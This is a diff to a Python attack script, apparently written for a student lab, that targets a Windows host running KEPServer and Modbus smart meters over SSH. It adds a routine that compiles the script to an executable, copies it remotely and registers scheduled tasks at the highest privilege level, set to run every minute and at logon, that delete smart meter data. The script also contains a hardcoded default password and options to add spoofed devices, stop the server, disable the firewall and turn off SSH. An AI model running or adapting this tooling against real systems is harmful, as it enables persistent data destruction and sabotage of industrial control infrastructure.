@@ -22,6 +22,8 @@ import sys
 # from Powershell.callPowerShell import runPowerShellScript
 import paramiko
 from scp import SCPClient
+import socket
+import platform
 
 class AttackScript:
     def __init__(self, ip, username = "Student", password = "Student12345@"):
@@ -134,15 +136,54 @@ class AttackScript:
         # Return the output
         return ssh_output
 
-    # Delete files in a specific folder
-    # TODO: Document this code, or remove it.
-    def delete_files(self,folder_path):
-        for root, dirs, files in walk(folder_path):
-            for file in files:
-                og = path.join(root, file)
-                dest = path.join(self.COPIED_PATH, file)
-                remove(og)
-                print("File: " + str(og) + " is deleted")
+    def scheduled_task_delete_files(self, folder_path) -> None:
+        """
+        # NOTE: This is adapted from the previous team. I dont even know if the smartmeter path even exist tbh
+        
+        Delete the smartmeter path prediodically through task scheduler through the executable attack 1. If the executable doesnt exist in the destination device, try to package this script to exe and transfer the exe remotely
+        
+        Args:
+            folder_path (str):
+        """
+        ip_addr = socket.gethostbyname(socket.gethostname())
+
+        # If the thing is ran locally
+        if ip_addr == self.WINDOWS_SERVER_IP:
+            for root, dirs, files in walk(folder_path):
+                for file in files:
+                    og = path.join(root, file)
+                    dest = path.join(self.COPIED_PATH, file)
+                    remove(og)
+                    print("File: " + str(og) + " is deleted")
+        
+        # Remotely transfer the exe and run attack 1, which will then run locally
+        else:
+            check_file_exist = self.ssh_run_command(f"dir {self.MODPOLL_PATH}")
+
+            if path.basename(__file__).rsplit('.', 1)[0] + ".exe" not in check_file_exist.split(" "):
+                if platform.system() != "Windows":
+                    raise Exception("Executable not found in remote machine, need to be a windows machine to package this to exe and transfer remotely")
+                self.transfer_exe_remotely()
+
+            executable_file_path = f"{self.MODPOLL_PATH}/{path.basename(__file__).rsplit('.', 1)[0]}.exe" 
+
+            executable_file_parameters = '1'
+
+            task_name1 = 'Smart Meter Testing'
+            task_name2 = 'Smart Meter Testing 2'
+
+            # TODO: Run a native command prompt with task scheduler without cmd window appearing
+            # task_name3 = 'Smart Meter Testing 3' # Be even more annoying and run the command locally to delete
+
+            sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
+            sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
+            # TODO: Test if the task scheduler works.
+            command_output_1 = self.ssh_run_command(sch1)
+            command_output_2 = self.ssh_run_command(sch2)
+            print(command_output_1); print(command_output_2)
+            print("\nOk.\n")
+
+
 
     def create_scheduled_task(self) -> None:
         """
@@ -461,7 +502,7 @@ class AttackScript:
         """
         self.kep_server_stop()
         
-        executable_path = MODPOLL_PATH + r"\modpoll.exe"
+        executable_path = self.MODPOLL_PATH + r"\modpoll.exe"
 
         parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "201", "COM1", "26"]
 
@@ -575,7 +616,7 @@ class AttackScript:
         for baudrate in baudrate_list:
             parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "-1", "COM1"]
             baudrate_output = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
-
+            print(baudrate_output)
             print(f"Checking baudrate {baudrate}:")
         
             if "[206]:" in baudrate_output:
@@ -585,7 +626,7 @@ class AttackScript:
             else:
                 print(f"Baudrate is not {baudrate}\n")
 
-        # NOTE: The kep_server_start() is removed as commands using this function will try to stop KEPServer anyways
+        # NOTE: The kep_server_start() is removed as commands using this function will try to start KEPServer anyways
         print("\nOk.\n")
 
         return found_baudrate
@@ -1084,15 +1125,15 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(admin.users.get_all_users(server),indent=4),file=sys.stdout)
 
-    def kep_enable_user(self,user):
+    def kep_enable_user(self, user):
         server = self.kep_connect()
         print(admin.users.enable_user(server, user),file=sys.stdout)
 
-    def kep_disable_user(self,user):
+    def kep_disable_user(self, user):
         server = self.kep_connect()
         print(admin.users.disable_user(server, user),file=sys.stdout)
 
-    def kep_get_single_user(self,user):
+    def kep_get_single_user(self, user):
         server = self.kep_connect()
         print(json.dumps(admin.users.get_user(server, user),indent=4),file=sys.stdout)
 
@@ -1104,12 +1145,12 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(connectivity.device.get_all_devices(server, channel), indent=4))
 
-    def kep_get_single_device(self,channel,device): # Example of a single device is "SmartMeter.ministicHACKED"
+    def kep_get_single_device(self, channel, device): # Example of a single device is "SmartMeter.ministicHACKED"
         server = self.kep_connect()
         device_to_get = ".".join([channel, device])
         print(json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))
 
-    def kep_add_spoofed_device(self,channel,device):
+    def kep_add_spoofed_device(self, channel, device):
         server = self.kep_connect()
         device_to_get = ".".join([channel, device])
         print("ADD DEVICE: " + json.dumps(connectivity.device.add_device(server, channel, {"common.ALLTYPES_NAME": device, "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial", "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888}), indent=4))
@@ -1165,7 +1206,7 @@ class AttackScript:
             print("Something went wrong!")
             return False
 
-    def kep_server_start(self):
+    def kep_server_start(self) -> bool:
         """
         Starts KEPServer service
 
@@ -1221,30 +1262,89 @@ class AttackScript:
             return True
         return False
 
-    def dummy_test(self) -> None:
-        print("Hello, I am very cooool")
+    def scp_transfer_file(self, local_full_path: str, remote_full_path: str) -> None:
+        """
+        # TODO: from self.ssh_run_command, uses the same ssh paramiko client. May need to cut the paramiko client connection to its own function, then both self.scp_transfer_file and self.ssh_run_command can use the same ssh paramiko client function
 
-    def exe(self):
-        # compiled_exe_output = run(["pyinstaller", "-F", "--onefile", sys.argv[0]], stdout=PIPE)
-        executable = sys.argv[0][:-3] + ".exe"
-        # command_output = self.ssh_run_command(f"scp dist/{sys.argv[0][:-3]}.exe {self.USERNAME}@{self.WINDOWS_SERVER_IP}:")
+        Transfer the a file remotely from host to destination machine.
 
+        Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file
+
+        Either a password OR a private key MUST be provided. If both are provided, the private key will be used.
+
+        Args:
+            command (str): The command to run on the remote server.
+            host (str): The hostname or IP address of the remote server.
+            username (str): The username to use for the SSH connection.
+            password (str): The password to use for the SSH connection.
+            private_key_path (str): The path to the private key file.
+            local_full_path (str): The local full path of the host machine, INCLUDING THE EXTENSION NAME
+            remote_full_path (str): The remote full path of the remote machine, INCLUDING THE EXTENSION NAME
+        """
+
+        # Create an SSH client
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-        ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
-        ssh_transport = ssh.get_transport() # TODO: Try to increase ssh transport speed
-        ssh_transport.default_window_size = 2147483647
-        ssh_transport.packetizer.REKEY_BYTES = pow(2, 40)
-        ssh_transport.packetizer.REKEY_PACKETS = pow(2, 40)
-        scp = SCPClient(ssh_transport, progress4=self.progress4)
-        print(sys.argv[0][:-3])
-        scp.put(f"dist/{sys.argv[0][:-3]}.exe", remote_path=f"{self.MODPOLL_PATH}/{sys.argv[0][:-3]}.exe")
+        try:
+            # Connect to the remote server, prioritizing private key over password
+            if self.PRIVATE_KEY_PATH is not None:
+                # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
+                private_key = paramiko.Ed25519Key.from_private_key_file(self.PRIVATE_KEY_PATH)
+                # Connect using the private key
+                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, pkey=private_key)
+            if self.PASSWORD is not None:
+                # Connect using password
+                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
+            else:
+                # Handle case when neither password nor private key is provided
+                print("Please provide either a password or a private key.")
+                return None
 
-        # Close the SCP client
-        scp.close() 
+            # Placeholder for other code to run after successful connection
+            print("Connected to the remote server.")
+            # Run the command
 
-        print(self.ssh_run_command(f"{self.MODPOLL_PATH}\\{sys.argv[0][:-3]}.exe cool"))
+            ssh_transport = ssh.get_transport()
+            ssh_transport.default_window_size = 2147483647
+            ssh_transport.packetizer.REKEY_BYTES = pow(2, 40)
+            ssh_transport.packetizer.REKEY_PACKETS = pow(2, 40)
+            scp = SCPClient(ssh_transport, progress4=self.progress4)
+            scp.put(local_full_path, remote_path=remote_full_path)
+
+            # Close the SCP client
+            scp.close()
+            
+        except paramiko.AuthenticationException:
+            print("Authentication failed. Please check your credentials.")
+            return None
+        except paramiko.SSHException as e:
+            print(f"An SSH error occurred: {e}")
+            return None
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            return None
+        ssh.close()
+
+    def dummy_test(self) -> None:
+        print("Hello, I am very cooool")
+
+    def transfer_exe_remotely(self, remote_path=None):
+        """
+        Convert this current script to exe and transfer to the specified remote_path
+
+        Args:
+            remote_path (str): the remote path to send the exe. (Does NOT include the filename) By default uses the modpoll path
+        """
+        compiled_exe_output = run(["pyinstaller", "-F", "--onefile", path.basename(__file__)], stdout=PIPE)
+        executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"
+
+        if remote_path is None:
+            remote_path = self.MODPOLL_PATH
+
+        self.scp_transfer_file(f"dist/{executable_name}", remote_path=f"{remote_path}/{executable_name}")
+
+        #print(self.ssh_run_command(f"{self.MODPOLL_PATH}\\{sys.argv[0][:-3]}.exe cool"))
     
     def progress4(self, filename, size, sent, peername):
         sys.stdout.write("(%s:%s) %s's progress: %.2f%%   \r" % (peername[0], peername[1], filename, float(sent)/float(size)*100) )
@@ -1383,10 +1483,10 @@ class AttackScript:
         #     check_admin()
 
         match attack_option:
-            case "exe": self.exe()
             case "cool": self.dummy_test()
             case "start": self.kep_server_start()
-            case "1":  self.create_scheduled_task() # TODO: Determine if this function is depricated or can be modified
+            case "check": self.baudrate_check()
+            case "1":  self.scheduled_task_delete_files(self.SMARTMETER_PATH) # TODO: Determine if this function is depricated or can be modified
             #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH) # TODO: Determine if this function is depricated
             case "3":  self.disable_firewall()
             case "4":  self.disable_ssh()
